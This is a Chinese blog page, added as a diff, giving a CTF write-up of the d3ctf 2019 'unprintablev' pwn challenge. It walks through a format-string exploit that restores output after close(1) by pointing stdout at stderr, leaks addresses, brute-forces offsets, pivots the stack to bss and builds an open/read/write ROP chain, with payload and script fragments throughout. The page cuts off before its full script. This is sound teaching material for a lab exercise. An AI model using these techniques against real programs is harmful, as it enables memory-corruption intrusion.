@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+<script async defer data-website-id="9aab3793-bf4f-4055-8c11-e23ab244a0d0" src="https://analyze.timochan.cn/umami.js"></script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wp.zgroot.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="总结：通过这道题的学习与收获有： 1、close 关闭了标准输出时，可以用格式化字符串漏洞来将stdout指向的内容修改成IO_2_1_stderr，让程序重新有回显，关于这个过程我画了张图方便自己理解。     2、已经拿到libc基地址的时候，我们所需要的gadget就可以直接去libc中拿，libc里啥都有，libc里啥都有，libc里啥都有，重要的事情说三遍！ 3、写爆破脚本时，感觉会报错">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF_d3ctf_unprintablev(2019)">
+<meta property="og:url" content="https://wp.zgroot.cn/BUU/BUUCTF_d3ctf_2019_unprintablev/index.html">
+<meta property="og:site_name" content="楼上请让路*的WP">
+<meta property="og:description" content="总结：通过这道题的学习与收获有： 1、close 关闭了标准输出时，可以用格式化字符串漏洞来将stdout指向的内容修改成IO_2_1_stderr，让程序重新有回显，关于这个过程我画了张图方便自己理解。     2、已经拿到libc基地址的时候，我们所需要的gadget就可以直接去libc中拿，libc里啥都有，libc里啥都有，libc里啥都有，重要的事情说三遍！ 3、写爆破脚本时，感觉会报错">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429210243217.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220428205917903.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220428210310835.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220428210118223.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220428210156841.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429120513056.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429120543301.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429120948542.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429121046146.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429131219657.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429131426041.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429131503421.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429132536061.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429135139870.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429142543524.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429145805076.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429200013595.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429184528636.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429201250680.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429204629254.png">
+<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220429204916689.png">
+<meta property="article:published_time" content="2022-04-30T00:46:25.000Z">
+<meta property="article:modified_time" content="2022-07-01T10:54:14.715Z">
+<meta property="article:author" content="楼上请让路*">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wp.zgroot.cn/upload/img/image-20220429210243217.png">
+
+<link rel="canonical" href="https://wp.zgroot.cn/BUU/BUUCTF_d3ctf_2019_unprintablev/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUCTF_d3ctf_unprintablev(2019) | 楼上请让路*的WP</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">楼上请让路*的WP</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">wp发布</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wp.zgroot.cn/BUU/BUUCTF_d3ctf_2019_unprintablev/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/image.png">
+      <meta itemprop="name" content="楼上请让路*">
+      <meta itemprop="description" content="楼上请让路*的WP">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="楼上请让路*的WP">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUCTF_d3ctf_unprintablev(2019)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-30 08:46:25 08:46:25" itemprop="dateCreated datePublished" datetime="2022-04-30T08:46:25+08:00">2022-04-30 08:46:25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-01 18:54:14 18:54:14" itemprop="dateModified" datetime="2022-07-01T18:54:14+08:00">2022-07-01 18:54:14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BUU/" itemprop="url" rel="index"><span itemprop="name">BUU</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
+<p>1、close 关闭了标准输出时，可以用格式化字符串漏洞来将stdout指向的内容修改成IO_2_1_stderr，让程序重新有回显，关于这个过程我画了张图方便自己理解。</p>
+<img src="/upload/img/image-20220429210243217.png" alt="image-20220429210243217" style="width:50%;" />
+
+
+
+<p>2、已经拿到libc基地址的时候，我们所需要的gadget就可以直接去libc中拿，libc里啥都有，libc里啥都有，libc里啥都有，重要的事情说三遍！</p>
+<p>3、写爆破脚本时，感觉会报错的地方，用try和except预判一手，让程序得以继续重新运行，而不是原地崩溃。</p>
+<p>4、如果close(1)关闭了标准输出，那么格式化字符串漏洞的写入数据最多只能写入0x2000字节，程序如果执行了setvbuf，stdout会出现在bss段，反之则会在libc库中。</p>
+<span id="more"></span>
+<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><img src="/upload/img/image-20220428205917903.png" alt="image-20220428205917903" style="width:100%;" />
+
+<img src="/upload/img/image-20220428210310835.png" alt="image-20220428210310835" style="width: 100%;" />
+
+<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><img src="/upload/img/image-20220428210118223.png" alt="image-20220428210118223" style="width:100%;" />
+
+<img src="/upload/img/image-20220428210156841.png" alt="image-20220428210156841" style="width: 100%;" />
+
+<p>程序分析起来完全没压力，就是开了个沙箱，然后关闭了标准输出，然后循环100次格式化字符串漏洞（如果输入d^3CTF则会直接退出程序），数据是输入到了bss段。另外就是保护开了PIE</p>
+<p>这道题可以说是de1ctf_2019_unprintable这道的强化版（因为某些方面这道题更简单），如果你现在在做本题并且没有做过unprintable这道题的话，建议先去做<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>这道题。</p>
+<p>其实要说强化也不至于，这俩的区别就是一个是GetShell，一个是orw。前面的手法还是差不多的，ok，下面来分析一下这道题	</p>
+<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><p>首先这道题可以利用一百次的格式化字符串漏洞，这个相比于de1ctf_2019_unprintable的话是简单很多的。因为开了沙箱，那就考虑orw。有了unprintable这道题的经验，就很容易想到这道个题的思路也是将rop链布置到bss，然后将栈迁移到bss段即可。</p>
+<p>然后就是最不好想的点，close(1)怎么处理？如果我们可以获取shell的话，可以将文件描述符重定位一下，用socket+connect也可以对抗close(1)（具体参考[这篇文章](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">easyrop_2022胖哈勃春季赛 - ZikH26 - 博客园 (cnblogs.com)</a>)）但是对于这道题而言都行不通，如果不能搞定这个close(1)，libc基地址和程序地址都无法泄露，那啥都没有还做个锤子…</p>
+<p>在此学习到了一种新的手法来处理close(1)</p>
+<blockquote>
+<p>程序中的stdout（它是个指针）只是相当于一个跳板的作用（目的是去libc中寻IO_2_1_stdout地址），而IO_2_1_stdout所使用文件描述符1，close(1)关闭的是文件描述符1，但是程序中想要进行输出，并不是去直接跟文件描述符相接触，而是通过stdout来去访问到文件描述符(事实上它访问的是IO_2_1_stdout这个结构，而这个结构使用了文件描述符），举个例子，即使文件描述符1被关闭，但是<strong>执行puts的时候，程序是不知道文件描述符被关闭了，因此它依然会通过stdout来去寻找IO_2_1_stdout</strong>（以获取文件描述符1），<strong>等找到IO_2_1_stdout，程序才意识到文件描述符1被关闭，因此并不会让puts出现任何回显</strong>。</p>
+<p>但是如果我们可以在这个过程的中间做手脚比如将原本stdout所指向的IO_2_1_stdout修改为IO_2_1_stderr，等程序来寻找的时候，最终获取了文件描述符2，由于文件描述符2对应的终端也是屏幕，最终执行puts成功出现了回显。</p>
+</blockquote>
+<p>PS:<strong>程序如果setvbuf，stdout会出现在bss段，反之则会在libc库中</strong>。</p>
+<p>因此当前思路就是利用格式化字符串将stdout所指向的IO_2_1_stdout修改为IO_2_1_stderr，让程序出现回显。（另外就是一个大坑，<strong>如果close(1)关闭了标准输出，那么格式化字符串漏洞的写入数据最多只能写入0x2000字节</strong>（本菜狗通过实验仅仅只发现了这个规律，目前还不知道原因，如果各位师傅知道原因的话，还请告知）</p>
+<h3 id="重启输出"><a href="#重启输出" class="headerlink" title="重启输出"></a>重启输出</h3><p>由于输入是在bss段上，要是想修改栈中的数据，就要去布置一条栈链（关于栈链本文不再多说，具体可以去看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>这篇文章）</p>
+<p>然后通过栈链来修改数据。</p>
+<h3 id="布置栈链"><a href="#布置栈链" class="headerlink" title="布置栈链"></a>布置栈链</h3><img src="/upload/img/image-20220429120513056.png" alt="image-20220429120513056" style="width: 100%;" />
+
+<p>首先发现栈中存在bss段上buf的地址<font color=red>（<strong>请注意区分buf的地址，和指向buf的地址）</strong></font>，因此我们要把0x7fffffffdf58布置到栈里面，通过0x7fffffffdf58来改写0x555555756060,将其改写为stdout的地址，然后通过stdout的地址来修改libc中IO_2_1_stdout。</p>
+<p>发现这里有一条栈链（如下图），那么我们拿它来开刀</p>
+<p><img src="/upload/img/image-20220429120543301.png" alt="image-20220429120543301"></p>
+<p>这个偏移是6，因此第一次输入payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>leak为程序自己泄露的地址取最后一字节，通过调试发现程序自己泄露的地址就是<strong>指向buf的地址</strong>，而我们现在就是要利用栈链把<strong>指向buf的地址</strong>写到栈里。</p>
+<p>下图为修改前：</p>
+<p><img src="/upload/img/image-20220429120948542.png" alt="image-20220429120948542"></p>
+<p>下图为修改后：</p>
+<p><img src="/upload/img/image-20220429121046146.png" alt="image-20220429121046146"></p>
+<p>下一步，通过指向buf的地址来修改buf地址，将其修改为stdout的值，也就是通过下图来进行修改</p>
+<p><img src="/upload/img/image-20220429131219657.png" alt="image-20220429131219657"></p>
+<p>由图可知，偏移取10（考虑六个寄存器），payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改前：</p>
+<img src="/upload/img/image-20220429131426041.png" alt="image-20220429131426041" style="width: 67%;" />
+
+<p>修改后：</p>
+<p><img src="/upload/img/image-20220429131503421.png" alt="image-20220429131503421"></p>
+<p>此时buf已经被修改成了stdout的值，可以看到stdout指向了IO_2_1_stdout。</p>
+<h3 id="修改IO-2-1-stdout"><a href="#修改IO-2-1-stdout" class="headerlink" title="修改IO_2_1_stdout"></a>修改IO_2_1_stdout</h3><p>最后通过stdout将IO_2_1_stdout改为IO_2_1_stderr即可。</p>
+<p>IO_2_1_stderr的偏移去libc中找（如下图），由于最后偏移只是最后一个半字节不同，但是利用格式化字符串要么修改一字节要么修改两字节，因此这里我们采用修改后两字节，即爆破倒数第四位（我们采用hn写入，但是对偏移取&amp;0xfff，因此我们一直在爆破成功的条件就是libc基地址倒数第四位为0时）</p>
+<p><img src="/upload/img/image-20220429132536061.png" alt="image-20220429132536061"></p>
+<p>这里的payload为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>stderr为IO_2_1_stderr地址最后三位</p>
+<p>由于这里是需要爆破的，如果爆破不成功就意味着修改失败，则程序依然不会给回显，因此我们通过程序是否有回显来判断,如果有回显的话，我们发过去的aaaaa肯定是可以被接收的，否则则返回当前函数，继续爆破。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>下面为爆破成功修改stdout的情况，可以看到此时的stdout已经指向了IO_2_1_stderr</p>
+<p><img src="/upload/img/image-20220429135139870.png" alt="image-20220429135139870"></p>
+<p>至此我们的输出已经被重启，那剩下的就随便玩了。</p>
+<h3 id="泄露数据"><a href="#泄露数据" class="headerlink" title="泄露数据"></a>泄露数据</h3><p>由于接下来要对抗PIE以及要获取libc，因此我们要先泄露一下栈中数据。我们要获取栈基地址，libc基地址，程序基地址，观察栈里情况（如下图）</p>
+<img src="/upload/img/image-20220429142543524.png" alt="image-20220429142543524" style="width:67%;" />
+
+<p>如果此时直接发送payload会发现后门的数据都连包了，如果每次sendline之前都打上pause()，那么在格式化字符串执行的时候要你把所有的sendline全发了才能去执行，如果全发的话会连包… （这里补充一个很细的技巧，每次发送数据时，把payload给填满，这样就可以避免连包的产生），payload如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h3><p>因为最后的核心是在bss段布置rop链，因此我们需要把栈给迁移到bss段。大致思路是将返回地址改写成pop rsp地址，而把返回地址下面的内容改成要迁移的bss段地址，最后执行pop rsp的时候就完成了迁移，最终执行我们布置在bss段上rop链。</p>
+<p>先说修改返回地址。</p>
+<p><img src="/upload/img/image-20220429145805076.png" alt="image-20220429145805076"></p>
+<p>只需要拿pop rsp的地址加上程序基地址的偏移，然后取后两字节就ok了。不过通过观察当前栈发现，依旧是需要栈链来修改返回地址，因为没有栈的内容指向了返回地址（如下图）</p>
+<p><img src="/upload/img/image-20220429200013595.png" alt="image-20220429200013595"></p>
+<p>将栈顶内存单元指向的0x7ffe8cfa5578改成0x7ffe8cfa5588（如下图），这步的目的是通过0x7ffe8cfa5588来修改menu的返回地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>修改后：</p>
+<p><img src="/upload/img/image-20220429184528636.png" alt="image-20220429184528636"></p>
+<p>然后将menu函数的返回地址修改成pop rsp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>下图为修改后：</p>
+<p><img src="/upload/img/image-20220429201250680.png" alt="image-20220429201250680"></p>
+<p>此时返回地址已经修改完成，最后两步分别是布置迁移地址和构造rop链，先说布置迁移地址。</p>
+<h3 id="布置迁移地址"><a href="#布置迁移地址" class="headerlink" title="布置迁移地址"></a>布置迁移地址</h3><p>这个过程和<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>一模一样（原理在这篇文章中已经解释），就不再解释原理了，直接放这部分脚本了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 布置迁移地址bss_addr+0x10  因为bss要存放d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><p>首先要触发pop rsp，肯定是要结束循环，因此我们输入的payload最开始要存放字符串d^3CTF，同时我们要采用orw，open的flag字符串也要存入。所以d^3CTF后面再写个flag字符串。又因为最开始的pop rsp后面还有pop r13;pop r14;pop r15，因此在字符串后面填入24字节的垃圾数据（为了避免将字符串弹入寄存器，我们迁移的地址垫高0x10字节）</p>
+<p>至此开始正式布置rop链，这里说一下，我最开始用的是mprotect函数改写bss段属性，最后本地获取了flag，但是远程没有显示flag（但是脚本写的是没问题的，远程不通是个未解之谜…这个脚本我放到文末了）</p>
+<p>mprotect行不通，那就采用传统方式，传参然后执行函数。</p>
+<p>我们接下来就是要执行下面的内容，值得一提的是由于close关闭了文件描述符1，因此open返回的文件描述符是1（文件描述符是取当前可用文件描述符的最小的那一个，此时0,2被占用，因此1是最小），同时由于stdout指向了IO_2_1_stderr,所以我们应该使用文件描述符2进行输出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">1</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br><span class="line">write(<span class="number">2</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
+
+<p>至于传参之类所需要的gadget，用啥就去libc库里找（因为现在libc基地址是知道的），libc里啥都有。</p>
